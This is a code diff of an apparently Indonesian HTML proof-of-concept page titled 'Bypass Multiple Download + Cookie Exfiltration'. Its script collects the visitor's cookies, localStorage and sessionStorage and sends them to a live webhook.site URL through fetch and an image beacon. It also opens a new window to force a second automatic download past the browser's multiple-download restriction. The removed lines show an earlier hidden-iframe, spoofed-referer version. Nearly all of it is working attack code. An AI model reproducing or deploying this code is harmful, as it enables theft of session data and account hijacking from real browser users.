@@ -1,21 +1,37 @@
 <!DOCTYPE html>
 <html lang="id">
+
 <head>
     <meta charset="UTF-8">
-    <title>Bypass Multiple Download + Fake Referer</title>
+    <title>Bypass Multiple Download PoC</title>
     <style>
-        body { font-family: system-ui, sans-serif; max-width: 400px; margin: 50px auto; text-align: center; }
-        button { padding: 12px 24px; background: #d93025; color: #fff; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 16px; }
+        body {
+            font-family: system-ui, sans-serif;
+            max-width: 400px;
+            margin: 50px auto;
+            text-align: center;
+        }
+
+        button {
+            padding: 12px 24px;
+            background: #d93025;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 16px;
+        }
     </style>
 </head>
+
 <body>
-    <h2>Advanced Download Bypass + Fake Referer</h2>
-    <p>File 1: From current domain<br>File 2: From google.com (spoofed)</p>
+    <h2>Bypass Multiple Download + Cookie Exfiltration</h2>
+    <p>Klik tombol untuk download 2 file & kirim cookie ke webhook.</p>
     <button onclick="executeBypass()">Jalankan Payload</button>
 
     <script>
         const WEBHOOK = "https://webhook.site/fd1f8ae0-9538-4102-9012-b6a41bbcfeb7";
-        const FAKE_REFERER = "https://google.com";
 
         function downloadFile(filename, content) {
             const blob = new Blob([content], { type: 'text/plain' });
@@ -34,8 +50,8 @@
                 event: eventName,
                 cookies: document.cookie || "NO_COOKIES",
                 localStorage: JSON.stringify(localStorage) || "{}",
+                sessionStorage: JSON.stringify(sessionStorage) || "{}",
                 userAgent: navigator.userAgent,
-                referer: document.referrer || document.location.href,
                 url: document.location.href,
                 time: new Date().toISOString(),
                 ...extraData
@@ -46,73 +62,47 @@
         }
 
         function executeBypass() {
-            // Step 1: Exfiltrasi data dari tab utama
             hitWebhook("initial_exfiltration", {
-                stage: "main_tab",
-                current_domain: document.location.hostname
+                stage: "1_of_2",
+                message: "Cookie & storage dicuri dari tab utama"
             });
 
-            // Step 2: Download file pertama (dari domain saat ini)
-            downloadFile('file_pertama.txt', 'Halo, ini file pertama dari domain saat ini.');
+            downloadFile('file_pertama.txt', 'Halo, ini isi file teks sederhana.\nBaris kedua di sini.');
 
-            // Step 3: Buat iframe tersembunyi untuk download file kedua
-            setTimeout(() => {
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.style.width = '0';
-                iframe.style.height = '0';
-                iframe.style.border = '0';
-                iframe.style.position = 'absolute';
-                iframe.style.left = '-9999px';
-                document.body.appendChild(iframe);
+            const newWin = window.open('', '_blank');
 
-                // Step 4: Inject halaman palsu yang mengklaim dari myweb.com
-                // Gunakan srcdoc untuk membuat konten seolah-olah dari myweb.com
-                iframe.srcdoc = `
-                    <!DOCTYPE html>
-                    <html>
-                    <head>
-                        <meta name="referrer" content="no-referrer-when-downgrade">
-                        <base href="${FAKE_REFERER}/">
-                    </head>
-                    <body>
-                        <script>
-                            // Kirim webhook dari iframe
-                            fetch("${WEBHOOK}?event=download_from_fake_referer&referer=${encodeURIComponent(FAKE_REFERER)}&file=file_kedua.txt", {
-                                method: 'GET',
-                                mode: 'no-cors',
-                                keepalive: true
-                            });
+            if (newWin) {
+                newWin.document.write(`
+                    <html><body>
+                    <script>
+                        const params = new URLSearchParams({
+                            event: "bypass_success",
+                            stage: "2_of_2",
+                            file: "file_kedua.txt",
+                            cookies: document.cookie || "NO_COOKIES",
+                            time: new Date().toISOString()
+                        });
+                        
+                        const img = new Image();
+                        img.src = "${WEBHOOK}?" + params.toString();
 
-                            // Buat dan download file
-                            setTimeout(() => {
-                                const blob = new Blob(['Ini adalah file kedua.\\n\\nDownload ini terlihat berasal dari google.com'], { type: 'text/plain' });
-                                const url = URL.createObjectURL(blob);
-                                const a = document.createElement('a');
-                                a.href = url;
-                                a.download = 'file_kedua.txt';
-                                
-                                // Set referrer policy untuk mempengaruhi header
-                                a.referrerPolicy = 'no-referrer-when-downgrade';
-                                
-                                document.body.appendChild(a);
-                                a.click();
-                                document.body.removeChild(a);
-                                URL.revokeObjectURL(url);
-                            }, 100);
-                        <\/script>
-                    </body>
-                    </html>
-                `;
+                        const blob = new Blob(['Ini adalah file kedua. Bypass multiple download berhasil!'], { type: 'text/plain' });
+                        const url = URL.createObjectURL(blob);
+                        const a = document.createElement('a');
+                        a.href = url;
+                        a.download = 'file_kedua.txt';
+                        document.body.appendChild(a);
+                        a.click();
+                        URL.revokeObjectURL(url);
 
-                // Step 5: Setelah iframe selesai load, hapus dari DOM
-                iframe.onload = () => {
-                    setTimeout(() => {
-                        document.body.removeChild(iframe);
-                    }, 2000);
-                };
-            }, 300);
+                        setTimeout(() => { window.close(); }, 1500);
+                    <\/script>
+                    </body></html>
+                `);
+                newWin.document.close();
+            }
         }
     </script>
 </body>
+
 </html>
